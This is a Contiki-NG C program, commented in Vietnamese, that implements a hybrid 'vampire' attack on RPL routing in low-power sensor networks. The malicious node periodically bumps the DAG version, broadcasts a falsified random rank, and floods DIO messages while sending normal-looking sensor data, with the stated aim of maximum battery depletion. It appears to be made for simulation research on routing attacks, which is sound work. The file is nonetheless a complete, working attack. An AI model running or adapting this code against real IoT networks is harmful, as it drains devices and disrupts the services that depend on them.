/*
 * VAMPIRE ATTACK: HYBRID ATTACK
 * 
 * Mô tả: Kết hợp Carousel + Stretch attack để tối đa hóa tiêu hao năng lượng
 * 
 * Đặc điểm:
 *   - Version manipulation (carousel)
 *   - Rank manipulation (stretch)
 *   - DIO flooding với moderate rate
 *   - Aggressive parent switching
 * 
 * Impact: Cực kỳ nguy hiểm - kết hợp cả routing loops và long routes
 *         Tiêu hao pin nghiêm trọng trong vùng xung quanh attacker
 */

#include "contiki.h"
#include "net/routing/routing.h"
#include "net/routing/rpl-lite/rpl.h"   
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "net/netstack.h"
#include "simple-udp.h"
#include "sys/node-id.h"
#include "sys/log.h"
#include "lib/random.h"

#define LOG_MODULE "HYBRID"
#define LOG_LEVEL LOG_LEVEL_INFO

#define SEND_PORT 8765

/* Hybrid attack parameters */
#define NORMAL_SEND_INTERVAL        (10 * CLOCK_SECOND)
#define VERSION_ATTACK_INTERVAL     (18 * CLOCK_SECOND)  // Version manipulation
#define RANK_ATTACK_INTERVAL        (25 * CLOCK_SECOND)  // Rank manipulation
#define DIO_MODERATE_FLOOD_INTERVAL (5 * CLOCK_SECOND)   // Moderate DIO rate

#define MALICIOUS_RANK_BASE     1600
#define MALICIOUS_RANK_VARIANCE 500

typedef struct {
  uint16_t cluster_id;
  uint16_t node_id_f;
  uint32_t seqno;
  uint32_t residual_mj;
  uint32_t tx_time;
  int16_t temperature_c;
} sensor_payload_t;

static struct simple_udp_connection udp_conn;

PROCESS(vampire_hybrid_process, "Vampire Hybrid Attack");
AUTOSTART_PROCESSES(&vampire_hybrid_process);

PROCESS_THREAD(vampire_hybrid_process, ev, data)
{
  static struct etimer send_timer;
  static struct etimer version_attack_timer;
  static struct etimer rank_attack_timer;
  static struct etimer dio_flood_timer;
  static uip_ipaddr_t dest_ipaddr;
  static uint32_t sent_count = 0;
  static uint32_t version_attack_count = 0;
  static uint32_t rank_attack_count = 0;
  
  PROCESS_BEGIN();

  simple_udp_register(&udp_conn, SEND_PORT, NULL, SEND_PORT, NULL);
  
  LOG_INFO("============================================\n");
  LOG_INFO("VAMPIRE ATTACK: HYBRID ATTACK ACTIVATED\n");
  LOG_INFO("Attack strategy: Carousel + Stretch + DIO flooding\n");
  LOG_INFO("WARNING: Maximum battery depletion mode\n");
  LOG_INFO("============================================\n");
  
  etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
  etimer_set(&version_attack_timer, VERSION_ATTACK_INTERVAL);
  etimer_set(&rank_attack_timer, RANK_ATTACK_INTERVAL);
  etimer_set(&dio_flood_timer, DIO_MODERATE_FLOOD_INTERVAL);

  while(1) {
    PROCESS_WAIT_EVENT();

    /* CAROUSEL COMPONENT: Version manipulation */
    if(ev == PROCESS_EVENT_TIMER && data == &version_attack_timer) {
        if(curr_instance.used) {
            uint8_t old_version = curr_instance.dag.version;
            curr_instance.dag.version += 8;  // Moderate increment
            
            LOG_INFO("HYBRID_ATTACK version_manipulation: %u -> %u (v_attack #%lu)\n", 
                     old_version, curr_instance.dag.version, 
                     (unsigned long)++version_attack_count);
            
            rpl_icmp6_dio_output(NULL);
        }
        etimer_set(&version_attack_timer, VERSION_ATTACK_INTERVAL);
    }

    /* STRETCH COMPONENT: Rank manipulation */
    if(ev == PROCESS_EVENT_TIMER && data == &rank_attack_timer) {
        if(curr_instance.used && curr_instance.dag.preferred_parent != NULL) {
            rpl_rank_t old_rank = curr_instance.dag.rank;
            
            rpl_rank_t malicious_rank = MALICIOUS_RANK_BASE + 
                                       (random_rand() % MALICIOUS_RANK_VARIANCE);
            curr_instance.dag.rank = malicious_rank;
            
            LOG_INFO("HYBRID_ATTACK rank_manipulation: %u -> %u (r_attack #%lu)\n", 
                     old_rank, curr_instance.dag.rank, 
                     (unsigned long)++rank_attack_count);
            
            rpl_icmp6_dio_output(NULL);
        }
        etimer_set(&rank_attack_timer, RANK_ATTACK_INTERVAL);
    }

    /* DIO FLOODING (moderate rate) */
    if(ev == PROCESS_EVENT_TIMER && data == &dio_flood_timer) {
        if(curr_instance.used) {
            rpl_icmp6_dio_output(NULL);
            LOG_DBG("HYBRID_ATTACK dio_flood\n");
        }
        etimer_set(&dio_flood_timer, DIO_MODERATE_FLOOD_INTERVAL);
    }

    /* Normal data transmission */
    if(ev == PROCESS_EVENT_TIMER && data == &send_timer) {
      if(NETSTACK_ROUTING.node_is_reachable() &&
         NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
        
        sensor_payload_t p;
        p.cluster_id = (node_id <= 26) ? 1 : 2;
        p.node_id_f = node_id;
        p.seqno = sent_count++;
        p.residual_mj = 7200;
        p.tx_time = clock_time();
        p.temperature_c = (int16_t)(250 + (random_rand() % 50));
        
        LOG_DBG("NORMAL_TX node=%u seq=%lu\n", node_id, (unsigned long)p.seqno);
        simple_udp_sendto(&udp_conn, &p, sizeof(p), &dest_ipaddr);
      }
      etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
    }
  }
  PROCESS_END();
}
